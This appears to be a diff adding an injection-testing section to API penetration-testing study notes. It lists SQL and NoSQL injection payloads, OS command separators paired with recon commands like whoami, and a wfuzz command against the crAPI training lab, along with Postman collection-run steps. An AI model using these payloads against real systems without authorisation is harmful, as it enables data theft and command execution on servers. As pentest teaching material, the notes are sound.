@@ -510,4 +510,115 @@ When targeting an API for SSRF vulnerabilities, you will want to look for reques
 
 ## Injection Attacks
 
+### Testing for Injection Vulnerabilities
+
+You should attempt fuzzing against all potential inputs and especially within the following:
+
+* Headers
+* Query string parameters
+* Parameters in POST/PUT requests
+
+#### Discovering Injection Vulnerabilities
+
+Before you can exploit an injection vulnerability you will need to know where to fuzz and what to fuzz with. The art of fuzzing is knowing the right payload to send in the right requests with the right tools. The right payload can be guessed or narrowed down based on reconnaissance efforts.
+
+#### SQL Injection Metacharacters
+
+When looking for requests to target for database injections, seek out those that allow client input and can be expected to interact with a database. Here are some SQL metacharacters that can cause some issues:
+
+```bash
+'
+''
+;%00
+--
+-- -
+""
+;
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+OR 1=1
+```
+
+#### NoSQL Injection
+
+The following are common NoSQL metacharacters you could send in an API request to manipulate the database:
+
+```bash
+$gt 
+{"$gt":""}
+{"$gt":-1}
+$ne
+{"$ne":""}
+{"$ne":-1}
+ $nin
+{"$nin":1}
+{"$nin":[1]}
+{"$where":  "sleep(1000)"}
+```
+
+#### OS Command Injection
+
+Characters such as the following all act as command separators, which enable a program to pair multiple commands together on a single line. If a web application is vulnerable, it would allow an attacker to add command separators to existing command and then follow it with additional operating system commands:
+
+```bash
+# Command Separators
+|
+||
+&
+&&
+'
+"
+;
+'"
+# System commands to use
+ipconfig
+dir
+ver
+whoami
+ifconfig
+ls
+pwd
+```
+
+#### Fuzzing Wide with Postman
+
+Postman really shines when it comes to testing an entire API collection thanks to the Collection Runner. Whereas, Burp Suite CE and WFuzz are much better at digging into individual requests.
+
+#### Injection Targets
+
+For injection targets, we will begin by casting a wide net and seeing which requests respond in interesting ways. Let's target many of the requests that include user input.
+
+#### Fuzzing Deep with WFuzz
+
+Intercept request in Burp to view details to provide to the wfuzz command.
+
+```bash
+wfuzz -z file,usr/share/wordlists/nosqli \
+ -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
+ -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
+ 
+```
+
 ## Evasion and Combining Techniques
+
+## Postman
+
+### Duplicate Collection
+
+1. Select the ellipsis to the right of the current selection
+2. Select Duplicate
+3. Can rename the new Collection
+
+### Run Collection
+
+1. Select the ellipsis to the right of the current selection
+2. Select Run collection
+3. Select the necessary request to target
+4. Select Save responses
+5. Run the collection
+6. Review Failed tests
+   1. Develop understanding how the API is responding to expected requests and how the API responds to our fuzzing attempts
+      1. Document results to compare for after the next run of the collection
